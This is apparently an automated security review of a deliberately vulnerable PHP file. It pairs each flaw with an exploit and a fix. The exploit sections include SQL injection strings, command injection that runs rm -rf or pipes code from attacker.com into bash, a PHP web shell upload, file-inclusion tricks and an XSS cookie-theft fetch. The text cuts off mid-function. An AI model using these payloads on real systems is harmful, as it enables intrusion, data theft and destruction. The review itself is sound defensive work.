VSec Code Security Review
Repository : https://github.com/sirconscious/vulnerable_php_code.git
Generated  : 2026-03-13 21:40:24
============================================================

# ====================================================
# CODE SECURITY REVIEW
# Repository : https://github.com/sirconscious/vulnerable_php_code.git
# Language(s): PHP
# Files      : 1 (main.php)
# ====================================================

## [EXECUTIVE SUMMARY]
This codebase contains **critical security vulnerabilities** that expose the application to complete compromise. Multiple injection attacks (SQL, command, file inclusion), hardcoded credentials, arbitrary file uploads, and authentication bypass flaws are present. This code should **never** be deployed to production and requires immediate remediation of all identified issues.

---

## [VULNERABILITIES]

### Vuln #1
**Severity** : Critical  
**Type** : SQL Injection  
**File** : main.php (lines 18-19)  
**Code** :
```php
$username = $_GET['username'];
$password = $_GET['password'];
$query = "SELECT * FROM users WHERE username='" . $username . "' AND password='" . $password . "'";
$result = mysqli_query($conn, $query);
```
**Exploit** :
```
GET /login.php?username=admin'--&password=anything HTTP/1.1

Resulting query:
SELECT * FROM users WHERE username='admin'--' AND password='anything'

The '--' comments out the password check, allowing login as admin with any password.

Alternative: ?username=admin' OR '1'='1&password=x
Results in: SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='x'
Logs in as first user regardless of credentials.

Advanced: ?username=admin'; DROP TABLE users;--&password=x
Can execute destructive queries.
```
**Fix** :
```php
// Use prepared statements
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
$result = $stmt->get_result();
```

---

### Vuln #2
**Severity** : Critical  
**Type** : Remote Code Execution (Command Injection)  
**File** : main.php (line 36)  
**Code** :
```php
$host = $_GET['host'];
$output = shell_exec('ping -c 4 ' . $host);
echo "<pre>" . $output . "</pre>";
```
**Exploit** :
```
GET /exec.php?host=google.com;%20cat%20/etc/passwd HTTP/1.1

Executes:
ping -c 4 google.com; cat /etc/passwd

Returns contents of /etc/passwd to attacker.

More destructive:
?host=google.com;%20rm%20-rf%20/var/www/html/*
?host=google.com;%20curl%20http://attacker.com/malware.sh%20|%20bash
?host=google.com;%20wget%20-O%20/tmp/backdoor%20http://attacker.com/shell.php
```
**Fix** :
```php
// Use escapeshellarg() at minimum (better: avoid shell_exec entirely)
$host = escapeshellarg($_GET['host']);
$output = shell_exec('ping -c 4 ' . $host);

// Best practice: use exec() with output array
$output = [];
exec('ping -c 4 ' . escapeshellarg($_GET['host']), $output);
```

---

### Vuln #3
**Severity** : Critical  
**Type** : Arbitrary File Upload (Unrestricted Upload)  
**File** : main.php (lines 29-33)  
**Code** :
```php
if ($_FILES['file']['error'] == 0) {
    $dest = 'uploads/' . $_FILES['file']['name'];
    move_uploaded_file($_FILES['file']['tmp_name'], $dest);
    echo "Uploaded: " . $dest;
}
```
**Exploit** :
```
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--

File saved as: /var/www/html/uploads/shell.php

Attacker then accesses: /uploads/shell.php?cmd=id
Gains remote code execution as web server user.

Alternative: Upload .htaccess to execute all .jpg files as PHP:
AddType application/x-httpd-php .jpg

Then upload image.jpg containing PHP code.
```
**Fix** :
```php
// Whitelist allowed extensions
$allowed_ext = ['jpg', 'jpeg', 'png', 'gif'];
$file_ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));

if (!in_array($file_ext, $allowed_ext)) {
    die("Invalid file type");
}

// Validate MIME type
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);
$allowed_mimes = ['image/jpeg', 'image/png', 'image/gif'];

if (!in_array($mime, $allowed_mimes)) {
    die("Invalid file MIME type");
}

// Rename to random filename
$new_name = bin2hex(random_bytes(16)) . '.' . $file_ext;
$dest = 'uploads/' . $new_name;

// Store outside web root if possible
move_uploaded_file($_FILES['file']['tmp_name'], $dest);
```

---

### Vuln #4
**Severity** : Critical  
**Type** : Path Traversal (Local File Inclusion)  
**File** : main.php (lines 39-41)  
**Code** :
```php
$page = $_GET['page'];
include($page . '.php');
```
**Exploit** :
```
GET /file.php?page=../../etc/passwd HTTP/1.1

Attempts to include: /etc/passwd.php (fails but may leak info)

Better attack with PHP wrappers:
GET /file.php?page=php://filter/convert.base64-encode/resource=config HTTP/1.1

Includes base64-encoded contents of config.php (revealing hardcoded credentials)

Or with log poisoning:
GET /file.php?page=../../var/log/apache2/access.log HTTP/1.1

If access logs contain PHP code (via poisoning), it executes.
```
**Fix** :
```php
// Use whitelist approach
$allowed_pages = ['home', 'about', 'contact', 'dashboard'];
$page = $_GET['page'] ?? 'home';

if (!in_array($page, $allowed_pages)) {
    die("Invalid page");
}

include(__DIR__ . '/pages/' . $page . '.php');

// Alternative: use switch statement
switch ($page) {
    case 'home':
        include 'pages/home.php';
        break;
    case 'about':
        include 'pages/about.php';
        break;
    default:
        include 'pages/home.php';
}
```

---

### Vuln #5
**Severity** : Critical  
**Type** : Insecure Direct Object Reference (IDOR) + Sensitive Data Exposure  
**File** : main.php (lines 44-50)  
**Code** :
```php
$user_id = $_GET['id'];   // no auth check
$query = "SELECT * FROM users WHERE id=" . $user_id;
$result = mysqli_query($conn, $query);
$user = mysqli_fetch_assoc($result);
echo json_encode($user);  // dumps full user row including password hash
```
**Exploit** :
```
GET /api.php?id=1 HTTP/1.1

Returns:
{
  "id": 1,
  "username": "admin",
  "email": "admin@example.com",
  "password": "a1b2c3d4e5f6...",  // password hash exposed
  "phone": "555-1234",
  "address": "123 Main St",
  "credit_card": "4111111111111111"  // PII exposed!
}

Attacker can iterate:
GET /api.php?id=1
GET /api.php?id=2
GET /api.php?id=3
...

Harvests all user data without authentication.

Also combines with SQLi:
GET /api.php?id=1 OR 1=1 LIMIT 1,1
Returns next user record.
```
**Fix** :
```php
// Check authentication and authorization
session_start();
if (!isset($_SESSION['user_id'])) {
    http_response_code(401);
    die(json_encode(['error' => 'Unauthorized']));
}

// Verify user can only access their own data
$requested_id = intval($_GET['id']);
if ($_SESSION['user_id'] != $requested_id && $_SESSION['role'] !== 'admin') {
    http_response_code(403);
    die(json_encode(['error' => 'Forbidden']));
}

// Use prepared statement
$stmt = $conn->prepare("SELECT id, username, email FROM users WHERE id = ?");
$stmt->bind_param("i", $requested_id);
$stmt->execute();
$result = $stmt->get_result();
$user = $result->fetch_assoc();

// Never expose sensitive fields
unset($user['password']);
echo json_encode($user);
```

---

### Vuln #6
**Severity** : Critical  
**Type** : Reflected Cross-Site Scripting (XSS)  
**File** : main.php (line 23)  
**Code** :
```php
$username = $_GET['username'];
if (mysqli_num_rows($result) > 0) {
    $_SESSION['user'] = $username;
    echo "Welcome " . $username;  // XSS — unsanitized output
}
```
**Exploit** :
```
GET /login.php?username=<img%20src=x%20onerror="alert('XSS')">&password=test

Output:
Welcome <img src=x onerror="alert('XSS')">

Browser executes JavaScript:
- Steals session cookies
- Redirects to phishing page
- Captures keystrokes
- Modifies page content

Advanced:
?username=<script>fetch('http://attacker.com/steal.php?cookie='+document.cookie)</script>
```
**Fix** :
```php
echo "Welcome " . htmlspecialchars($username, ENT_QUOTES, 'UTF-8');

// Or use proper templating
echo "Welcome " . escapeHtml($username);

// Define escapeHtml function
function escapeHtml($text) {
    return htmlspecialchars($text, ENT_QUOTES | ENT_HTML5, 'UTF-8');
}
```

---

### Vuln #7
**Severity** : High  
**Type** : Numeric SQL Injection (Type Confusion)  
**File** : main.php (line 47)  
**Code** :
```php
$user_id = $_GET['id'];
$query = "SELECT * FROM users WHERE id=" . $user_id;
```
**Exploit** :
```
GET /api.php?id=1 OR 1=1

Results in: SELECT * FROM users WHERE id=1 OR 1=1
Returns all users instead of user ID 1.

GET /api.php?id=1; DROP TABLE users;--

Destructive query execution.
```
**Fix** :
```php
// Cast to integer
$user_id = intval($_GET['id']);
$query = "SELECT * FROM users WHERE id=" . $user_id;

// Better: use prepared statement
$stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $_GET['id']);
$stmt->execute();
```

---

## [SECURITY MISCONFIGURATIONS]

### Config #1
**Severity** : Critical  
**Type** : Hardcoded Database Credentials  
**File** : main.php (lines 2-5)  
**Code** :
```php
define('DB_HOST', 'localhost');
define('DB_USER', 'root');
define('DB_PASS', 'admin123');          // hardcoded credential
define('DB_NAME', 'shop_db');
```
**Issue** :
- Credentials visible in source code
- Accessible if code is exposed (GitHub, leaked backups, etc.)
- Cannot be rotated without code change
- Weak password ('admin123')

**Fix** :
```php
// Store in environment variables (.env file, NOT in repo)
$db_host = getenv('DB_HOST') ?: 'localhost';
$db_user = getenv('DB_USER');
$db_pass = getenv('DB_PASS');
$db_name = getenv('DB_NAME');

// Or use .env parsing library (PHP dotenv)
require_once 'vendor/autoload.php';
$dotenv = Dotenv\Dotenv::createImmutable(__DIR__);
$dotenv->load();

define('DB_HOST', $_ENV['DB_HOST']);
define('DB_USER', $_ENV['DB_USER']);
define('DB_PASS', $_ENV['DB_PASS']);
define('DB_NAME', $_ENV['DB_NAME']);

// .env file (add to .gitignore):
DB_HOST=localhost
DB_USER=shop_user
DB_PASS=<strong_random_password>
DB_NAME=shop_db
```

---

### Config #2
**Severity** : Critical  
**Type** : Hardcoded Secret Key  
**File** : main.php (line 6)  
**Code** :
```php
define('SECRET_KEY', 'abc123secret');   // hardcoded secret
```
**Issue** :
- Weak secret for session/CSRF tokens
- Exposed in source code
- Identical across all deployments

**Fix** :
```php
// Generate random secret from environment
define('SECRET_KEY', getenv('SECRET_KEY'));

// Generate via command line (one-time):
// php -r "echo bin2hex(random_bytes(32));"

// .env
SECRET_KEY=a7f3e9c2d5b8f1a4e7c9d2b5f8a1e4c7d0b3e6f9a2c5d8e1f4a7b0c3d6e9f2
```

---

### Config #3
**Severity** : High  
**Type** : Debug Mode Enabled in Production  
**File** : main.php (line 7)  
**Code** :
```php
define('DEBUG', true);                  // debug mode on
```
**Issue** :
- Exposes detailed error messages to users
- Reveals file paths, database structure
- Information disclosure vulnerability

**Fix** :
```php
define('DEBUG', getenv('DEBUG') === 'true' ? true : false);

// .env
DEBUG=false  // Set to false in production
```

---

### Config #4
**Severity** : High  
**Type** : Missing Input Validation Framework  
**File** : main.php (lines 17-18, 28, 35, 39, 43)  
**Code** :
```php
// No input validation/sanitization anywhere
$username = $_GET['username'];  // no checks
$password = $_GET['password'];  // no checks
$page = $_GET['page'];          // no checks
$host = $_GET['host'];          // no checks
```
**Issue** :
- All user input directly used in dangerous contexts
- No type checking, length validation, or sanitization

**Fix** :
```php
// Create validation function
function validateInput($input, $type = 'string', $max_length = 255) {
    if (is_array($input)) {
        return false;
    }
    
    $input = trim($input);
    
    if (strlen($input) > $max_length) {
        return false;
    }
    
    if ($type === 'email' && !filter_var($input, FILTER_VALIDATE_EMAIL)) {
        return false;
    }
    
    if ($type === 'integer' && !ctype_digit($input)) {
        return false;
    